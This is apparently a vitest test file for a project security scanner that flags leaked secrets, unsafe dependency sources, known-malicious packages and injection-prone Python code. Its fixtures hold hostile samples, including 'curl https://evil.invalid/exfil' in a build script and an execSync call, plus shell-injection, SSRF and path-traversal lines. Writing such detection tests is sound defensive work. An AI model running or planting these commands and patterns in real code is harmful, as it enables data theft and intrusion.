import { readFileSync } from "node:fs";
import { describe, expect, it } from "vitest";
import { safeDockerRelativePath } from "../lib/dockerValidator.js";
import {
  scanProjectFiles,
  validateGeneratedSecurityPosture,
} from "../services/projectSecurityScanner.js";
import { getStackScaffold } from "../services/stackScaffolds.js";

describe("#16 security hardening", () => {
  it("fails closed on Docker artifact paths that can escape or alias the project root", () => {
    expect(safeDockerRelativePath("src/index.ts")).toBe("src/index.ts");
    expect(safeDockerRelativePath("../escape.ts")).toBeNull();
    expect(safeDockerRelativePath("src/../escape.ts")).toBeNull();
    expect(safeDockerRelativePath("/etc/passwd")).toBeNull();
    expect(safeDockerRelativePath("C:/Windows/system.ini")).toBeNull();
    expect(safeDockerRelativePath("src\\escape.ts")).toBeNull();
  });

  it("keeps Docker dependency proof networked but executes generated validation offline", () => {
    const docker = readFileSync("src/lib/dockerValidator.ts", "utf8");
    expect(docker).toContain("npm install --ignore-scripts");
    expect(docker).toContain("npm audit --audit-level=high");
    expect(docker).toContain("pip-audit -r requirements.txt");
    expect(docker).toContain("--network=none");
    expect(docker).not.toContain("--no-audit");
    expect(docker).toContain("docker_input_security");
  });

  it("blocks persisted secrets, unsafe package sources, dangerous scripts, and malicious packages", () => {
    const scan = scanProjectFiles({
      ".env.production": [
        "DATABASE_URL=postgres://user:password@example.invalid/prod",
        "OPENAI_API_KEY=sk-proj-abcdefghijklmnopqrstuvwxyz012345",
      ].join("\n"),
      "package.json": JSON.stringify({
        scripts: {
          build: "vite build && curl https://evil.invalid/exfil",
        },
        dependencies: {
          "flatmap-stream": "0.1.1",
          remote: "git+https://example.invalid/repo.git",
        },
      }),
      "requirements.txt": "-e git+https://example.invalid/repo.git#egg=unsafe",
    });

    const ids = scan.findings.map((finding) => finding.ruleId);
    expect(ids).toEqual(
      expect.arrayContaining([
        "secret.env-artifact",
        "secret.model-provider-key",
        "dependency.unsafe-source",
        "dependency.unsafe-script",
        "dependency.known-malicious",
        "dependency.python-unsafe-source",
      ]),
    );
    expect(scan.passed).toBe(false);
  });

  it("blocks Python command injection, SSRF, path traversal surfaces, SQL interpolation, XSS, and open redirects", () => {
    const scan = scanProjectFiles({
      "app/main.py": [
        "import os, subprocess, requests",
        "from pathlib import Path",
        "from flask import request, redirect, render_template_string",
        "subprocess.run(request.args['cmd'], shell=True)",
        "requests.get(request.args['url'])",
        "open(request.args['path']).read()",
        "cursor.execute(f\"SELECT * FROM users WHERE id={request.args['id']}\")",
        "render_template_string(request.args['html'])",
        "redirect(request.args['next'])",
        "user_id = request.args['user_id']",
        "print(os.getenv('OPENAI_API_KEY'))",
      ].join("\n"),
    });

    const ids = scan.findings.map((finding) => finding.ruleId);
    expect(ids).toEqual(
      expect.arrayContaining([
        "command.python-shell",
        "ssrf.python-untrusted-request",
        "path.python-untrusted-file-operation",
        "sql.python-interpolation",
        "web.python-unsafe-html",
        "web.python-open-redirect",
        "auth.python-client-controlled-identity",
        "secret.python-logging",
      ]),
    );
    expect(scan.passed).toBe(false);
  });

  it("keeps generated Python services on the secure header, abuse-control, and rate-limit baseline", () => {
    const files = getStackScaffold("python-service", "api");
    expect(scanProjectFiles(files).passed).toBe(true);
    expect(validateGeneratedSecurityPosture(files, "python-service")).toEqual([]);
    expect(files["requirements.txt"]).toContain("slowapi");
    expect(files["app/main.py"]).toContain("MAX_BODY_BYTES");
    expect(files["app/main.py"]).toContain("X-Content-Type-Options");
    expect(files["app/main.py"]).toContain("Limiter");
  });

  it("blocks literal credential assignments and dangerous fixed host operations", () => {
    const scan = scanProjectFiles({
      "src/unsafe.ts": [
        'const DATABASE_URL = "postgres://user:password@db.invalid/prod";',
        'execSync("curl https://evil.invalid/exfil");',
        'writeFile("/etc/appforge.conf", "x", () => undefined);',
      ].join("\n"),
    });

    expect(scan.findings.map((finding) => finding.ruleId)).toEqual(
      expect.arrayContaining([
        "secret.literal-assignment",
        "command.dangerous-fixed-shell",
        "path.system-file-operation",
      ]),
    );
    expect(scan.passed).toBe(false);
  });

  it("does not mistake ordinary parser/application token variables for credentials", () => {
    const scan = scanProjectFiles({
      "src/parser.ts": 'const token = "identifier"; const csrfToken = "placeholder";',
    });
    expect(scan.findings.map((finding) => finding.ruleId)).not.toContain(
      "secret.literal-assignment",
    );
  });

  it("allows placeholder-only environment examples", () => {
    const scan = scanProjectFiles({
      ".env.example": [
        "DATABASE_URL=YOUR_DATABASE_URL",
        "OPENAI_API_KEY=<your-api-key>",
      ].join("\n"),
    });
    expect(scan.passed).toBe(true);
    expect(scan.findings).toEqual([]);
  });
});
